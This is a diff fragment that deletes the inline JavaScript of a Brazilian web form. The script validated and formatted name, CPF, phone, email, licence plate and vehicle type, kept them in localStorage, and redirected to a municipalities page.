-        } else if (/^[A-Z]{3}\d[A-Z]\d{2}$/.test(placa)) {
-          // Formato Mercosul
-          return placa;
-        }
-      }
-      
-      return placa;
-    }
-    
-    // Carregar dados do localStorage
-    function loadStoredData() {
-      // Verificar se temos dados do CEP
-      const cepData = localStorage.getItem('cepData');
-      if (cepData) {
-        const data = JSON.parse(cepData);
-        cepInput.value = data.cep;
-        cidadeInput.value = data.city;
-        estadoInput.value = data.state;
-      } else {
-        // Se não tiver CEP, redirecionar para home
-        alert('Por favor, informe seu CEP na página inicial.');
-        window.location.href = '/';
-        return false;
-      }
-      
-      // Verificar se já temos dados do usuário salvos
-      const userData = localStorage.getItem('userData');
-      if (userData) {
-        const data = JSON.parse(userData);
-        nomeInput.value = data.nome || '';
-        cpfInput.value = data.cpf || '';
-        telefoneInput.value = data.telefone || '';
-        emailInput.value = data.email || '';
-        placaInput.value = data.placa || '';
-        
-        if (data.tipoVeiculo === 'carro') {
-          optionCarro.classList.add('selected');
-          tipoVeiculoInput.value = 'carro';
-        } else if (data.tipoVeiculo === 'moto') {
-          optionMoto.classList.add('selected');
-          tipoVeiculoInput.value = 'moto';
-        }
-      }
-      
-      return true;
-    }
-    
-    // Manipular seleção de tipo de veículo
-    optionCarro.addEventListener('click', () => {
-      optionCarro.classList.add('selected');
-      optionMoto.classList.remove('selected');
-      tipoVeiculoInput.value = 'carro';
-      document.getElementById('tipoVeiculo-error').textContent = '';
-    });
-    
-    optionMoto.addEventListener('click', () => {
-      optionMoto.classList.add('selected');
-      optionCarro.classList.remove('selected');
-      tipoVeiculoInput.value = 'moto';
-      document.getElementById('tipoVeiculo-error').textContent = '';
-    });
-    
-    // Validar formulário
-    function validateForm() {
-      let isValid = true;
-      
-      // Validar nome
-      if (!nomeInput.value.trim()) {
-        document.getElementById('nome-error').textContent = 'Nome é obrigatório';
-        isValid = false;
-      } else if (nomeInput.value.trim().length < 3) {
-        document.getElementById('nome-error').textContent = 'Nome deve ter pelo menos 3 caracteres';
-        isValid = false;
-      } else {
-        document.getElementById('nome-error').textContent = '';
-      }
-      
-      // Validar CPF
-      const cpf = cpfInput.value.replace(/\D/g, '');
-      if (!cpf) {
-        document.getElementById('cpf-error').textContent = 'CPF é obrigatório';
-        isValid = false;
-      } else if (!isValidCPF(cpf)) {
-        document.getElementById('cpf-error').textContent = 'CPF inválido';
-        isValid = false;
-      } else {
-        document.getElementById('cpf-error').textContent = '';
-      }
-      
-      // Validar telefone
-      const telefone = telefoneInput.value.replace(/\D/g, '');
-      if (!telefone) {
-        document.getElementById('telefone-error').textContent = 'Telefone é obrigatório';
-        isValid = false;
-      } else if (telefone.length < 10 || telefone.length > 11) {
-        document.getElementById('telefone-error').textContent = 'Telefone inválido';
-        isValid = false;
-      } else {
-        document.getElementById('telefone-error').textContent = '';
-      }
-      
-      // Validar email
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailInput.value.trim()) {
-        document.getElementById('email-error').textContent = 'E-mail é obrigatório';
-        isValid = false;
-      } else if (!emailRegex.test(emailInput.value.trim())) {
-        document.getElementById('email-error').textContent = 'E-mail inválido';
-        isValid = false;
-      } else {
-        document.getElementById('email-error').textContent = '';
-      }
-      
-      // Validar placa
-      const placa = placaInput.value.trim().toUpperCase();
-      if (!placa) {
-        document.getElementById('placa-error').textContent = 'Placa é obrigatória';
-        isValid = false;
-      } else if (!/^[A-Z]{3}[-]?\d{4}$/.test(placa) && !/^[A-Z]{3}\d[A-Z]\d{2}$/.test(placa)) {
-        document.getElementById('placa-error').textContent = 'Placa inválida';
-        isValid = false;
-      } else {
-        document.getElementById('placa-error').textContent = '';
-      }
-      
-      // Validar tipo de veículo
-      if (!tipoVeiculoInput.value) {
-        document.getElementById('tipoVeiculo-error').textContent = 'Selecione um tipo de veículo';
-        isValid = false;
-      } else {
-        document.getElementById('tipoVeiculo-error').textContent = '';
-      }
-      
-      return isValid;
-    }
-    
-    // Manipular formatação em tempo real
-    cpfInput.addEventListener('input', (e) => {
-      const rawValue = e.target.value.replace(/\D/g, '');
-      if (rawValue.length <= 11) {
-        e.target.value = formatCPF(rawValue);
-      }
-    });
-    
-    telefoneInput.addEventListener('input', (e) => {
-      const rawValue = e.target.value.replace(/\D/g, '');
-      if (rawValue.length <= 11) {
-        e.target.value = formatTelefone(rawValue);
-      }
-    });
-    
-    placaInput.addEventListener('input', (e) => {
-      e.target.value = formatPlaca(e.target.value);
-    });
-    
-    // Manipular envio do formulário
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      
-      if (validateForm()) {
-        // Salvar dados no localStorage
-        const userData = {
-          nome: nomeInput.value.trim(),
-          cpf: cpfInput.value,
-          telefone: telefoneInput.value,
-          email: emailInput.value.trim(),
-          placa: placaInput.value.toUpperCase(),
-          tipoVeiculo: tipoVeiculoInput.value,
-          cep: cepInput.value,
-          cidade: cidadeInput.value,
-          estado: estadoInput.value
-        };
-        
-        localStorage.setItem('userData', JSON.stringify(userData));
-        
-        // Redirecionar para a próxima página
-        window.location.href = '/municipios';
-      }
-    });
-    
-    // Botão voltar
-    btnVoltar.addEventListener('click', () => {
-      window.location.href = '/';
-    });
-    
-    // Inicializar página
-    document.addEventListener('DOMContentLoaded', () => {
-      // Carregar dados do localStorage
-      if (!loadStoredData()) {
-        return;
-      }
-    });
-  </script>
-</body>
+  </body>
 </html>
